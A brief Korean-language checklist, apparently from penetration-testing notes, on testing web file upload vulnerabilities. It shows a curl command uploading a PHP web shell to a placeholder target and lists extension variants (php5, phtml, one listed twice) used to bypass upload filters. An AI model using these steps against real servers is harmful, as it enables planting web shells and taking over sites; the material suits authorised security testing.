# 파일 업로드

파일 업로드 취약점 점검 내용입니다.

## 테스트

```bash
curl -F "file=@shell.php" http://target/upload
```

## 확장자 우회

```bash
shell.php5
shell.phtml
shell.phtml
```
